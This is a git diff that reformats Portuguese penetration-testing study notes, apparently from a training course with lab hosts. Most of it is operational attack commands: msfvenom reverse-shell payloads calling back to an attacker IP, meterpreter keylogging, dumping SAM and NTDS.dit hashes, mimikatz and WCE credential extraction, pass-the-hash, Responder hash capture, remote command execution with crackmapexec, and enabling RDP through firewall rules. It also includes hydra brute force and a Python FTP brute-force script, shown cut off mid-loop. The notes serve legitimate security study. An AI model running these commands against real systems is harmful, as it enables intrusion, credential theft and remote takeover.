@@ -344,7 +344,7 @@ Socket significa IP e porta
 
 - Comandos úteis para Wireshark e TCPDUMP
 
-Comandos para trazer as portas abertas do pacote capturado
+.
 
     tcpdump -vvvxr monitoramento.pcapng 'tcp[tcpflags] & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)' 
 
@@ -405,7 +405,9 @@ Procura pacotes que usaram o serviço DNS
 
 
 1> STDOUT
+
 2> STDERR
+
 0>  STDIN
 
 	grep "href" index.html | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1 | grep -v "<li" > parsinglist
@@ -479,7 +481,7 @@ Comandos Windows equivalentes no LINUX
 	}} catch {}
 	}
 
--- Comandos POWERSHELL WEB
+- Comandos POWERSHELL WEB
 
 .
 
@@ -515,7 +517,7 @@ Conexão usando NETCAT
 
  - Copiando arquivos entre hosts com o NETCAT
 
-NETCAT
+.
 
     nc -vnlp 5050 < arquivo.ext 
 
@@ -532,7 +534,7 @@ Verifica o tamanho do arquivo enviado e compara para certificar a integridade.
 
 - Port Scanning
 
-NETCAT
+.
 
     nc -vnz 192.168.0.10 80 
 
@@ -552,6 +554,7 @@ PortScan usando um arquivo
 
 
 - HoneyPot
+
 .
 
     while true;do sudo nc -vnlp 21 < 21.txt 1>> log21.txt 2>> log21.txt; echo $(date) >> log21.txt;done
@@ -1036,6 +1039,7 @@ Exemplo de UDP Connect Scan Port
 
 
 - Network Sweeping
+
 .
 
     nmap -v -sn 192.168.2.0/24 -oG ativos.txt 
@@ -1339,6 +1343,7 @@ Nota:	Porta 139 NetBios porta mais antiga
 Porta 445 SMB serviço mais atual
 
 - Enumerando SMB no CMD	
+
 .
 
     nbtstat -A 192.168.2.101 
@@ -1392,6 +1397,7 @@ Conecta diretamente ao arquivos/pasta do host
 
 
 - Enumerando com RPC
+
 .
 
     rpcclient -U " " -N 172.16.1.5
@@ -1492,6 +1498,7 @@ Conecta com a porta 23 para fazer login e encontra as senhas em cirt.net/passwor
 
 
 - Enumerando com SSH
+
 .
     nc 172.16.1.1,2,5,120 22 
 
@@ -1503,6 +1510,7 @@ SSH em modo verbose com informações detalhadas informando as chaves de autenti
 
 
 - Subindo serviço de SSH
+
 .
 
     nano /etc/ssh/sshd_config 
@@ -1525,6 +1533,7 @@ Nota: Criar usuário e colocar a chave pública dentro do servidor para ganhar a
 
 
 - Enumerando Network File System (NFS) -P 2049
+
 .
     
     rpcinfo -p 172.16.1.5 | grep nfs 
@@ -1611,6 +1620,7 @@ NC para conexão udp com host
 
 
 - Enumeração MySQL
+
 .
 
     mysql -h 172.16.1.5 -u root 
@@ -1639,22 +1649,21 @@ Dentro do mysql mostra a lista de tabelas da base de dados
 
 ## ANÁLISE DE VULNERABILIDADES
 
+Sites que têm exploits e informações de vulnerabilidades.
 
-    Sites que têm exploits e informações de vulnerabilidades.
+packetsormsicurity.com/files/tags/exploits
 
-        packetsormsicurity.com/files/tags/exploits
+securityfocus.com/vulnerabilidades
 
-        securityfocus.com/vulnerabilidades
+Exploit-db.com
 
-        Exploit-db.com
+Cvedetails.com
 
-        Cvedetails.com
+nvd.nist.gov/vuln/search
 
-        nvd.nist.gov/vuln/search
+Rapid7.com
 
-        Rapid7.com
-
-    Ferramentas de automação de análise de vulnerabilidades:
+Ferramentas de automação de análise de vulnerabilidades:
 
         Nessus - service nessusd start | stop
 
@@ -1665,575 +1674,565 @@ Dentro do mysql mostra a lista de tabelas da base de dados
         searchsploit webmin
 
 
-NMAP NSE
+- NMAP NSE
+
+.
 
     /user/share/nmap/scripts# grep "ftp" scripts.db 
 
-        Pesquisa por script pelo nome
+Pesquisa por script pelo nome
 
     /user/share/nmap/scripts# nmap -p21 --script ftp-vsftpd-backdoor.nse -Pn 192.168.2.10 
 
-        Pesquisa por vulnerabilidade com o script informado
+Pesquisa por vulnerabilidade com o script informado
 
     /user/share/nmap/scripts# nmap -p21 --script ftp-vsftpd-backdoor.nse --script-args cmd="ls -la" -Pn 192.168.2.10 
 
-        Executa argumentos para validação da vulnerabilidade
+Executa argumentos para validação da vulnerabilidade
 
     /user/share/nmap/scripts# nmap -p21 --script ftp-anon.nse -Pn 172.16.1.108 
 
-        Procurando por vulnerabilidade de FTP com usuário anônimo
+Procurando por vulnerabilidade de FTP com usuário anônimo
 
     /user/share/nmap/scripts# nmap -p80 --script http-shellshock --script-args uri=/sgi-bin/test.cgi,cmd=ls 172.30.0.108
 
-        Executando o script com argumentos após a varredura do host e descobrir o caminho test.cgi
+Executando o script com argumentos após a varredura do host e descobrir o caminho test.cgi
 
 
 Nota: Shadow Brokers do Nessus para busca por vulnerabilidades de 2017 publicadas pelo shadow brokers.
 
 
-    METASPLOIT FRAMEWORK
+## METASPLOIT FRAMEWORK
 
 
     systemctl start postgresql 
 
-        Iniciar o banco de dados para ser usado pelo msfconsole
+Iniciar o banco de dados para ser usado pelo msfconsole
 
     msfdb init 
 
-        Iniciar o banco de dados do metasploit
+Iniciar o banco de dados do metasploit
 
     searchsploits proftp 
 
-        Procura por exploits dentro do metasploit
+Procura por exploits dentro do metasploit
 
     use auxiliary/scanner/portscan/tcp 
 
-        Usa o auxiliar para fazer portscan
+Usa o auxiliar para fazer portscan
 
     back 
 
-        Sai do auxiliar/exploit que você estava usando
+Sai do auxiliar/exploit que você estava usando
 
     search type:auxiliary|exploit portscan|snmp|smb|rdp 
 
-        Procura por tipo e termo informado facilitando o uso da ferramenta
+Procura por tipo e termo informado facilitando o uso da ferramenta
 
     services 
 
-        Mostra o que já foi descoberto/feito nos host (somente se estiver com a base de dados ativa)
+Mostra o que já foi descoberto/feito nos host (somente se estiver com a base de dados ativa)
 
     services -p21 
 
-        Exibe a porta já encontrada
+Exibe a porta já encontrada
 
     db_nmap -v --open -sS  -Pn 172.16.1.7 
 
-        Roda o Nmap dentro do MSF
+Roda o Nmap dentro do MSF
 
     nmap -v --open -sV  -Pn 172.16.1.4 -oX /opt/host4.xml
 
-        Nmap com output xml para importar no MSF
+Nmap com output xml para importar no MSF
 
     db_import /opt/host4.xml 
 
-        Importa o xml criado fora do ambiente
+Importa o xml criado fora do ambiente
 
     hosts 
 
-        Mostra todos os host encontrados na base do MSF
+Mostra todos os host encontrados na base do MSF
 
     vulns 
 
-        Verifica se há algum host com vulnerabilidades
+Verifica se há algum host com vulnerabilidades
 
     use auxiliary/scanner/ssh/ssh_login 
 
-        Usado para bruteforce de password ssh
+Usado para bruteforce de password ssh
 
     sessions 
 
-        Lista as sessões ativas no momento
+Lista as sessões ativas no momento
 
     sessions -i 1 
 
-        Entra na sessão 1 informada pelo comando anterior
+Entra na sessão 1 informada pelo comando anterior
 
     creds 
 
-        Mostra as credenciais salvas durante o pentest
+Mostra as credenciais salvas durante o pentest
 
     use auxiliary/scanner/smb/smb_version 
 
-        Auxiliar para enumerar a versão do smb em busca de informações detalhadas
+Auxiliar para enumerar a versão do smb em busca de informações detalhadas
 
     services -p 445 --rhosts 
 
-        Adiciona ao auxiliar/exploit os hosts daquela porta informada
+Adiciona ao auxiliar/exploit os hosts daquela porta informada
 
     hosts -i "informacao-a-ser-adicionada" 172.16.1.10 
 
-        Adiciona informação faltante do host
+Adiciona informação faltante do host
 
     search type:exploits samba 
 
-        Procura por exploits para pentest em Samba
+Procura por exploits para pentest em Samba
 
     search type:exploits fullname:"Samba x.x.x.x" 
 
-        Procura por nome e versão 
+Procura por nome e versão 
 
     use auxiliary/scanner/smb/smb_ms17_010 
 
-        Informa se o host é vulnerável ou não
+Informa se o host é vulnerável ou não
 
     use exploit/multi/samba/usermap_script 
 
-        Exploit para explorar vulnerabilidade do Samba no Linux
+Exploit para explorar vulnerabilidade do Samba no Linux
 
     show payloads 
 
-        Mostra os diferentes payloads disponíveis para o exploit usando no momento
+Mostra os diferentes payloads disponíveis para o exploit usando no momento
 
 
-Nota: 	Usar o payload Meterpreter habilitará funções adicionais.
-
+Nota: Usar o payload Meterpreter habilitará funções adicionais.
 Payloads com _ são mais simples e payloads com / são do tipo staged, mais funcionalidades. Arquivos do tipo POST são de pós exploração para por exemplo abrir porta RDP na vítima.
 
     nmap --open -p 445 --script=vuln -Pn 
 
-        Procura por vulnerabilidades com os scripts do NMAP
+Procura por vulnerabilidades com os scripts do NMAP
 
     search rdp 
 
-        Encontra os módulos RDP e use para abrir uma porta rdp no alvo 
+Encontra os módulos RDP e use para abrir uma porta rdp no alvo 
 
     xfreerdp /u:user@domain.com /v:192.168.2.11 
 
-        Conectar com RDP em modo gráfico
+Conectar com RDP em modo gráfico
 
     rdesktop
 
-        Alternativa para o xfreerdp
+Alternativa para o xfreerdp
 
     remmina
 
-        Alternativa para o rdesktop
+Alternativa para o rdesktop
 
 
 Comandos para rodar no Meterpreter do windows
 
     background 
 
-        No msf deixa a sessão em standby para voltar para a shell novamente mais tarde
+No msf deixa a sessão em standby para voltar para a shell novamente mais tarde
 
     PS
 
-        Mostra os processos atuais
+Mostra os processos atuais
 
     execute -f notepad
 
-        Abre um programa
+Abre um programa
 
     sysinfo
 
-        Mostra as infos do sistema
+Mostra as infos do sistema
 
     download local/do/arquivo
 
-        Baixa um arquivo
+Baixa um arquivo
 
     upload local/do/arquivo
 
-        Faz o upload de um arquivo
+Faz o upload de um arquivo
 
     keyboard_send "nao se esconda"
 
-        Envia um comando ao teclado
+Envia um comando ao teclado
 
     keyscan_start
 
-        Começa a escutar o teclado
+Começa a escutar o teclado
 
     key_scan dump
 
-        Faz um dump do teclado
+Faz um dump do teclado
 
 
-Comandos para uso no Msfvenom e Metasploit
+- Comandos para uso no Msfvenom e Metasploit
+
+.
 
     exploit/linux/http/ipfire_oinkode_exec 
 
-        Exploit para firewall IPFIRE com autenticação
+Exploit para firewall IPFIRE com autenticação
 
     auxiliary/scanner/http/http_login
 
-        Auxiliar para brute force de logind http
+Auxiliar para brute force de logind http
 
     Msfvenom
 
-        Ferramenta usada para desenvolver exploit, shell
+Ferramenta usada para desenvolver exploit, shell
 
     msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f exe -o shelldesec.exe 
 
-        Criar Exploit em EXE
+Criar Exploit em EXE
 
     use exploit/multi/handler (add host and door) 
 
-        Usa o exploit genérico para ter shell com o exploit criado
+Usa o exploit genérico para ter shell com o exploit criado
 
     set payload windows/x64/meterpreter/reverse_tcp 
 
-        Seta payload do exploit criado
+Seta payload do exploit criado
 
     python -m SimpleHTTPServer 80 
 
-        Abre servidor php para download de arquivos
+Abre servidor php para download de arquivos
 
     exploit -j 
 
-        Cria jobs para acessar novamente tipo sessions
+Cria jobs para acessar novamente tipo sessions
 
     jobs 
 
-        Lista os jobs criados com o exploit -j. O -K mata todos os jobs
+Lista os jobs criados com o exploit -j. O -K mata todos os jobs
 
     msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.0.16 lport:443 -f war -o desec.war 
 
-        Cria exploit em war
+Cria exploit em war
 
     msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f raw > desec.php 
 
-        Cria exploit em php
+Cria exploit em php
 
 
-    Solução Lab Desec Metasploit:
+Nota: Solução Lab Desec Metasploit:
 
         https://absolomb.com/2018-02-24-HackTheBox-Matis-Writeup 
-
         porta serv kerberos
-
-    ldapsearch --help 
-
-        Vasculha LDAP service do host passado
+    	ldapsearch --help 
+	Vasculha LDAP service do host passado
 
 
-
-    HASHES E SENHAS - LINUX
+## HASHES E SENHAS - LINUX
 
 
     echo -n "desec" | md5sum or | sha512sum or | sha256sum | sha1sum 
 
-        Codifica uma palavra em uma hash
+Codifica uma palavra em uma hash
 
     md5sum arquivo.exe 
 
-        Verifica o MD5 do arquivo passado
+Verifica o MD5 do arquivo passado
 
     bless arquivo.exe 
 
-        Ler e modifica um arquivo
+Ler e modifica um arquivo
 
-    Hash com Python: 
+Hash com Python: 
 
         Import Hashlib.md5("Desec").hexdigest()
-
         Import base64.b64encode("desec")
-
         Import base64.b64decode("desec")
+.
 
     hashid hashhere 
 
-        Ferramenta de identificação de hashes 
+Ferramenta de identificação de hashes 
 
     hash-identifier hashhere 
 
-        Ferramenta de identificação de hashes 
+Ferramenta de identificação de hashes 
 
-    Site de quebra de Hashes
+[Site de quebra de Hashes:](https://md5decrypt.net) [Altermativo](http://hashes.com)
 
-        md5decrypt.net 
-
-        hashes.com
-
-    Ferramenta de quebra de hashes	
+Ferramenta de quebra de hashes	
 
         john
-
         hashcat
+.
 
     openssl passwd -6 -salt c4r4c73res senha123 
 
-        Cria Hash do tipo 6 com salt (For more search, man crypt https://man.archlinux.org/man/crypt.5.en)
+Cria Hash do tipo 6 com salt (For more search, man crypt https://man.archlinux.org/man/crypt.5.en)
 
     for i in $(cat wordlist.txt);do echo -n $i " "; echo -n $i | md5sum;done > rainbow_tables
 
-        Função Bash para inserção de hash em wordlists
+Função Bash para inserção de hash em wordlists
 
     /etc/shadow 
 
-        Arquivo de hashes de senhas dos usuários do linux
+Arquivo de hashes de senhas dos usuários do linux
 
     unshadow /usr/passwd /usr/shadow > hashes 
 
-        Deixa o hash pronto para rodar no John the Ripper
+Deixa o hash pronto para rodar no John the Ripper
 
 
-Nota:	Tipo de hash das senhas do linux: CRYPT
+Nota: Tipo de hash das senhas do linux: CRYPT
 
- 		One Way -ex sha256
+	One Way ex.: sha256
+	Two Way ex.: base64
 
-Two Way -ex base64
+[Compilador alternativo portável GCC:](https://bellard.org/tcc/)
 
-    Compilador alternativo portável GCC: 
-
-        https://bellard.org/tcc/
-
-
-    loncrack 
-
-        Ferramenta do Longatto para quebra de hashes
+loncrack: Ferramenta do Longatto para quebra de hashes
 
         gcc loncrack.c -lcrypt -o loncrack 
 
-        Após baixar do GitHub compilar e executar
+Após baixar do GitHub compilar e executar
 
 
-    Script para quebra de senhas em Python
+Script para quebra de senhas em Python
 
-import crypt
+	import crypt
+	salt = "taltal"
+	senha = "asdasd"
+	crypt.crypt(senha,salt)
 
-salt = "taltal"
-
-senha = "asdasd"
-
-crypt.crypt(senha,salt)
-
+.
 
     exploit/linux/samba/is_known_pipename 
 
-        Exploit para samba em linux v3 e 4 e se der erro de encriptação, rodas os comando seguintes
+Exploit para samba em linux v3 e 4 e se der erro de encriptação, rodas os comando seguintes
 
         set smb::alwaysencrypt false  Seta a encrypt para falso
-
         set smb::protocolversion 1 Seta a versão para 1
 
-    Referências:
+Referências:
 
         https://www.whitehat.de/msf-metasploit-rubysmb-error-encryptionerror-communication-error-with-the-remote-host
-
         https://www.youtube.com/watch?v=JML84NJqnQU
 
 
-
-    HASHES E SENHAS - WINDOWS
+## HASHES E SENHAS - WINDOWS
 
 
     %systemRoot%/system32/config/sam 
 
-        Local do arquivo de contas de suarios
+Local do arquivo de contas de suarios
 
     %systemRoot%/ntds/ntds.dit 
 
-        Local dos arquivos de usuários do AD
+Local dos arquivos de usuários do AD
 
     %systemRoot%/system32/config/system 
 
-        Arquivo necessário para decriptar o sam
+Arquivo necessário para decriptar o sam
 
-        Obs.:Todos são bloqueados por execução e precisam de acesso administrativo
+Obs.:Todos são bloqueados por execução e precisam de acesso administrativo
 
     c:/windows/repair 
 
-        Local de backup desses arquivos (xp e 2003) possivelmente está desatualizado
+Local de backup desses arquivos (xp e 2003) possivelmente está desatualizado
 
     reg save hklm/sam sam 
 
-        Salva o arquivo SAM do Reg do Win (root) all version
+Salva o arquivo SAM do Reg do Win (root) all version
 
     reg save hklm/system system 
 
-        Salva o arquivo System do Reg do Win (root) all version
+Salva o arquivo System do Reg do Win (root) all version
 
     vssadmin 
 
-        Cópia de sombra de volume
+Cópia de sombra de volume
 
 
-Nota: 	Exploit/windows/smb/ms08_067_netapi RHOST 172.16.1.4 
+Nota: Exploit/windows/smb/ms08_067_netapi RHOST 172.16.1.4 
 
 Exploit de vulnerabilidade smb no XP
 
     meterpreter> hashdump2 
 
-        Captura as hashes dos usuários do sistema
+Captura as hashes dos usuários do sistema
 
     samdump2 system sam 
 
-        Captura/monta as hashes dos usuarios (unshadow)
+Captura/monta as hashes dos usuarios (unshadow)
 
     impacket-secretsdump -sam sam -system system LOCAL
 
-        Faz o mesmo que o samdump2
+Faz o mesmo que o samdump2
 
 
-    msf6> search UAC: Os dois melhores…
+msf6> search UAC: Os dois melhores…
 
         exploit/windows/local/ask 
 
-            Precisa da confirmação de usuário e de uma SESSION aberta para funcionar
+Precisa da confirmação de usuário e de uma SESSION aberta para funcionar
 
         exploit/windows/local/bypassuac_fodhelper 
 
-            Usa a SESSION mas não precisa da confirmação do user
+Usa a SESSION mas não precisa da confirmação do user
 
 
 Nota: exploit-Windows-Eternalblue-win8 RHOST 172.16.1.233
 
-Explorando o AD
+- Explorando o AD
+
+.
 
     vssadmin list volumes 
 
-        Lista os volumes para fazer a cópia
+Lista os volumes para fazer a cópia
 
     vssadmin create shadow /for=c: 
 
-        Cria uma cópia do c:
+Cria uma cópia do c:
 
     copy //nameCopiaSombra/windows/ntds/ntds.dit c:/ntds.dit 
 
-        Acessa a copia e copia o arquivo ntds do AD
+Acessa a copia e copia o arquivo ntds do AD
 
     copy //nameCopiaSombra/windows/system32/config/system c:/system 
 
-        Acessa a copia e copia o arquivo system
+Acessa a copia e copia o arquivo system
 
     impacket-secretsdump -ntds ntds.dit -system system LOCAL 
 
-        Mostra as hashes das contas de usuários do AD
+Mostra as hashes das contas de usuários do AD
 
 
-Quebrando senhas
+- Quebrando senhas
+
+.
 
     john --format=lm hashesLM --show 
 
-        Quebra senha formato LM com Brute
+Quebra senha formato LM com Brute
 
     john --format=nt hashesNTLM --show 
 
-        Quebra senha formato LM com Brute
+Quebra senha formato LM com Brute
 
 
-Senhas em cache
+- Senhas em cache
+
+.
 
     cd /usr/share/windows-binaries 
 
-        Contém executáveis do windows para exploração
+Contém executáveis do windows para exploração
 
     meterpreter> upload usr/share/windows-binaries/fgdump/fgdump.exe  c:/fgdump.exe 
 
-        Upload para a vítima para gerar os hashes em cache
+Upload para a vítima para gerar os hashes em cache
 
     shell: fgdump.exe 
 
-        Ele gerará dois arquivos cachedump e pwdump
+Ele gerará dois arquivos cachedump e pwdump
 
     meterpreter> upload usr/share/windows-binaries/wce/wce-universal.exe c:/wce-universal.exe 
 
-        Faz o upload do WCE para a vítima p/ quebra de senhas
+Faz o upload do WCE para a vítima p/ quebra de senhas
 
     shell:wce-universal.exe -w 
 
-        Traz as senhas em texto claro
+Traz as senhas em texto claro
 
     meterpreter> load mimikatz 
 
-        Carrega o módulo do meterpreter para quebra de senhas (Substituído pelo KIWI)
+Carrega o módulo do meterpreter para quebra de senhas (Substituído pelo KIWI)
 
     Wdigest
 
-        Quebra as senhas usando o mimikatz
+Quebra as senhas usando o mimikatz
 
     mimikatz-command 
 
-        Comando proprio do proprio mimikatz
+Comando proprio do proprio mimikatz
 
     mimikatz-command -f sekurlsa::wdigest -a full 
 
-        Quebra as senhas do alvo
+Quebra as senhas do alvo
 
     mimikatz-command -f sekurlsa::logonPasswords 
 
 Quebra as senhas dos usuários de logon
 
- 
-
 Usando as credenciais
 
     smbclient -L \\172.16.1.60 -U rogerio -W dominio
-
     smbclient -l //172.16.1.60/dados -U rogerio -W dominio
-
     xfreerdp /v:172.16.1.60 /u:rogerio /p:password
 
+- Obtendo Credenciais pela rede
 
-Obtendo Credenciais pela rede
+.
 
-    impacket-secretsdump user:senha@ip 
+impacket-secretsdump user:senha@ip 
 
-        Se conectará ao ip com as credenciais e varrerá a vítima em busca de outras credenciais/hashes
+Se conectará ao ip com as credenciais e varrerá a vítima em busca de outras credenciais/hashes
 
 
-	Subindo CMD com credenciais do Windows
+- Subindo CMD com credenciais do Windows
+
+.
 
     winexe -U user%password //172.16.1.60 cmd.exe 
 
-        Conseguir a shell do alvo usando credenciais válidas
+Conseguir a shell do alvo usando credenciais válidas
 
 
 NOTA: exploit/windows/smb/psexec, payload-x64-rev_tcp RHOST 172.16.1.60 para conseguir uma shell no alvo usando credenciais do AD no smb.
-
-        Pesquisar UAC no metasploit encontra exploit para pegar admin/privesc no windows com usuário comum usando uma sessão ativa no metasploit
+Pesquisar UAC no metasploit encontra exploit para pegar admin/privesc no windows com usuário comum usando uma sessão ativa no metasploit
 
     wce64.exe -w 
 
-        Executar no alvo o WCE64 dos resources do windows localizadas no kali e fazer a enumeração das hashes
+Executar no alvo o WCE64 dos resources do windows localizadas no kali e fazer a enumeração das hashes
 
     pth-winexe -U rogerio%hashencontrado //172.16.1.60 
 
-        Autentica usando a hash encontrada, o mesmo pode ser feito no exploit psexec PassTheHash
+Autentica usando a hash encontrada, o mesmo pode ser feito no exploit psexec PassTheHash
 
 
-Ferramenta completa de enumeração SMB
+- Ferramenta completa de enumeração SMB
+
+.
 
     apt install crackmapexec
+.
 
     crackmapexec smb 172.16.1.0/24 
 
-        Procura por hosts e faz a enumeração do smb automaticamente
+Procura por hosts e faz a enumeração do smb automaticamente
 
     crackmapexec smb 172.16.1.0/24 -u rogerio -p 'password' 
 
-        Faz a varredura e diz o que dá para fazer ou não usando as credenciais passadas
+Faz a varredura e diz o que dá para fazer ou não usando as credenciais passadas
 
     crackmapexec smb 172.16.1.60 -u rogerio -p 'password' -X  'ipconfig /all' 
 
-        Roda um comando no alvo e traz a saída. O -L lista os módulos e o -h apresenta o Help
+Roda um comando no alvo e traz a saída. O -L lista os módulos e o -h apresenta o Help
 
     responder 
 
-        Ferramenta de escuta para falsificar respostas feitas na rede e capturar hashes
+Ferramenta de escuta para falsificar respostas feitas na rede e capturar hashes
 
     responder -I eth0 -Prv 
 
-        Escuta de forma a capturar hashes wireshark de hashes. -r para habilitar as respostas netbios e -v para verbose
+Escuta de forma a capturar hashes wireshark de hashes. -r para habilitar as respostas netbios e -v para verbose
 
     hashcat -m 5600 arquivodahash /wordlist/pass.txt 
 
-        Quebra a senha encontrada
+Quebra a senha encontrada
 
     john --format=netntlmv2 arquivohash --wordlist=/caminho/wordlist.txt 
 
-        Quebra a senha encontrada
+Quebra a senha encontrada
 
     cp 44648.rb /caminho/do/modulo/metasploit/ 
 
@@ -2241,50 +2240,50 @@ Ferramenta completa de enumeração SMB
 
 
 
-    PENTEST INTERNO DO ZERO AO DOMAIN ADMIN
+## PENTEST INTERNO DO ZERO AO DOMAIN ADMIN
 
 
-    Escopo é pegar apenas os hosts do orionscorp e fazer os testes de segurança
+Escopo é pegar apenas os hosts do orionscorp e fazer os testes de segurança
 
     nmap -v -Pn -sS -p 445 172.16.1.0/24 -oG smb.txt 
 
-        Procura por hosts com compartilhamento ativo em busca do servidor de AD
+Procura por hosts com compartilhamento ativo em busca do servidor de AD
 
     crackmapexec smb targets-da-cap-canterior.txt 
 
-        Procura pelos hosts encontrados anteriormente para enumerar o serviço smb e saber dos computadores no grupo orionscorp
+Procura pelos hosts encontrados anteriormente para enumerar o serviço smb e saber dos computadores no grupo orionscorp
 
     nmap -v -Pn -p- 172.16.1.243 
 
-        Varre as portas do host do AD para saber dos serviços ativos
+Varre as portas do host do AD para saber dos serviços ativos
 
     host 172.16.1.241 172.16.1.243 
 
-        Para descobrir o nome do host perguntando para o servidor de DNS da orionscorp (segundo IP é o IP que responde à pergunta de DNS, quando passado)
+Para descobrir o nome do host perguntando para o servidor de DNS da orionscorp (segundo IP é o IP que responde à pergunta de DNS, quando passado)
 
     Maquina Pentester: cat /etc/responder/responder.conf
 
-         Em: RespondTo = 172.16.1.243, 172.16.1.241, 172.16.1.253 
+Em: RespondTo = 172.16.1.243, 172.16.1.241, 172.16.1.253 
 
     responder -I eth0 -Priv 
 
-        Escuta os hosts passados anteriormente e capturar os hashes pela rede - Ao capturar a hash use uma ferramenta para quebrar e obter a senha
+Escuta os hosts passados anteriormente e capturar os hashes pela rede - Ao capturar a hash use uma ferramenta para quebrar e obter a senha
 
 
 Validando os usuários
 
     crackmapexec smb hosts.txt -d dominio -u user -p 'password' 
 
-        Validar usuários encontrados e tentar saber qual tem permissão de execução de comandos Pwn3d!
+Validar usuários encontrados e tentar saber qual tem permissão de execução de comandos Pwn3d!
 
     python3 /usr/share/doc/python3-impacket/examples/psexec.py dominio/usuario:'senha@172.16.1.253' 
 
-        Faz a autenticação usando o psexec podendo também usar o metasploit
+Faz a autenticação usando o psexec podendo também usar o metasploit
 
 
 Nota: Com o usuário com permissão de execução de comandos, pode-se acessar o rpcclient e enumerar mais informações do servidor de AD.
 
-Ambiente WinXP: 
+- Ambiente WinXP: 
 
 Usando o repair é um cache antigo no caso nos sistemas windows XP...
            Usando o reg save é o que o hashdump usa, ou seja, mais atualizado.
@@ -2294,271 +2293,282 @@ No AD se usa o NTDS.dit
 
     impacket-secretsdump dominio/usuario:'senha'@172.16.1.253 
 
-        Tentar pegar as senhas dos administradores do sistema
+Tentar pegar as senhas dos administradores do sistema
 
     meterpreter: loads kiwi 
 
-        Carrega o Kiwi para enumeração de hashes 
+Carrega o Kiwi para enumeração de hashes 
 
     creds_all 
 
-        Trazendo os hashes dos usuários | DCC = domain cash credentials
+Trazendo os hashes dos usuários | DCC = domain cash credentials
 
     hashcat -m 2100 hash-tipo-dcc.txt /local-word/list.txt --show Quebra hash da credencial de ADM
 
+.
+
     crackmapexec 172.16.1.243 -u egabriel -p 'p@ssw0rd' -x 'ipconfig' 
 
-        Valida  a senha de adm e envia comando direto para a máquina do AD 
+Valida  a senha de adm e envia comando direto para a máquina do AD 
 
     crackmapexec smb 172.16.1.243 -u user -p 'password' -L 
 
-        Lista os módulos do crackmapexec inclusive te permite habilitar o RDP, caso esteja desabilitado
+Lista os módulos do crackmapexec inclusive te permite habilitar o RDP, caso esteja desabilitado
 
     crackmapexec smb 172.16.1.243 -u user -p 'password' -M rdp --options 
 
-        Lista as opções do módulo
+Lista as opções do módulo
 
     crackmapexec smb 172.16.1.243 -u user -p 'password' -M rdp -o ACTION=enable 
 
-        Ativa o modulo
+Ativa o modulo
 
     netsh advfirewall firewall add rule name="rdp" protocol=TCP dir=in localport=3389 action=allow 
 
-        Adiciona regra no firewall para habilitar o RDP
+Adiciona regra no firewall para habilitar o RDP
 
 
 
-    BRUTE FORCE
+## BRUTE FORCE
 
 
     grep -r "pedro123" * 
 
-        Vai buscar em todos os arquivos do diretório a palavra informada
+Vai buscar em todos os arquivos do diretório a palavra informada
 
     office2john arquivo.xls 
 
-        Prepara o arquivo para quebrar senha no John
+Prepara o arquivo para quebrar senha no John
 
     zip2john arquivo.zip 
 
-        Prepara o arquivo para quebrar a senha com o john
+Prepara o arquivo para quebrar a senha com o john
 
     john --wordlist=wl.txt --rules --stdout > mutacao 
 
-        Mutando uma wordlist existente
+Mutando uma wordlist existente
 
     /etc/john/john.conf | search wordlist mode rules | ^INI[1-10] $FIN[1-10]  
 
-        Personalizar wordlist com dígito no fim e no início.
+Personalizar wordlist com dígito no fim e no início.
 
     cewl site.com -m 7 
 
-        Busca palavras dentro do site com 7 chars
+Busca palavras dentro do site com 7 chars
 
     crunch 10 10 -t palavra^'char-spec'%'digito'@'minus','maius' 
 
-        Cria wordlist com a palavra passada e com dígitos com as flags informadas.
+Cria wordlist com a palavra passada e com dígitos com as flags informadas.
 
 
-Key Space Brute Force
+- Key Space Brute Force
+
+.
 
     crunch 4 4 0123456789 -o pin.txt 
 
-        Gera um pin de 4 digitos na wordlist
+Gera um pin de 4 digitos na wordlist
+
      chrunch 7 7 -t dev%%%%  > wldev.txt
-          Gera uma wordlist com a palabra dev seguida de 4 dígitos crescentes PIN
+
+Gera uma wordlist com a palabra dev seguida de 4 dígitos crescentes PIN
 
     crunch 4 4 -f charset.lst numeric -o pin.txt 
 
-        Gera um padrão usando a lista charset.lst (usr/share/crunch/charset.lst) e informando o padrão, se numérico, se caracteres especiais se alfabeto...
+Gera um padrão usando a lista charset.lst (usr/share/crunch/charset.lst) e informando o padrão, se numérico, se caracteres especiais se alfabeto...
 
     hydra -v -l rogerio -p admin -m servers.txt smb 
 
-        Bruteforce no serviço SMB. FTP, RDP
+Bruteforce no serviço SMB. FTP, RDP
 
     hydra -v -L users.txt -p admin 172.17.1.4 ssh -W 10 
 
-        Bruteforce em reverse brute force onde o bloqueio por tentativa é apenas no campo senha. E o tempo com de 10s de uma requisição para outra
+Bruteforce em reverse brute force onde o bloqueio por tentativa é apenas no campo senha. E o tempo com de 10s de uma requisição para outra
 
     hydra -v -l  user -p passwd -M servers.txt -s 2222 
 
-        Brute force com password encontrado em todos os servers.
+Brute force com password encontrado em todos os servers.
 
 
-    Script Bruteforce em FTP (usando python2)
+- Script Bruteforce em FTP (usando python2)
 
-#!/usr/bin/python
+.
 
-import socket,sys,re
+	#!/usr/bin/python
 
-if len(sys.argv) != 3:
+	import socket,sys,re
 
-    print ("modo de uso: nome do programa alvo e usuário")
+	if len(sys.argv) != 3:
 
-    sys.exit()
+	    print ("modo de uso: nome do programa alvo e usuário")
 
-target = sys.argv[1]
+	    sys.exit()
 
-usuario = sys.argv[2]
+	target = sys.argv[1]
 
-f = open ('wordlist.txt')
+	usuario = sys.argv[2]
 
-for palavra in f.readlines():
+	f = open ('wordlist.txt')
 
-          print ("realizando ataque FTP: %s:%s" %(usuario, palavra))
+	for palavra in f.readlines():
 
-          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		  print ("realizando ataque FTP: %s:%s" %(usuario, palavra))
 
-          s.connect((target, 21))
+		  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-          s.recv(1024)
+		  s.connect((target, 21))
 
-          s.send("USER "+usuario+"\r\n")
+		  s.recv(1024)
 
-          s.recv(1024)
+		  s.send("USER "+usuario+"\r\n")
 
-          s.send("PASS "+palavra+"\r\n")
+		  s.recv(1024)
 
-          resposta = s.recv(1024)
+		  s.send("PASS "+palavra+"\r\n")
 
-          s.send("QUIT \r\n")
+		  resposta = s.recv(1024)
 
-          if re.search('230', resposta):
+		  s.send("QUIT \r\n")
 
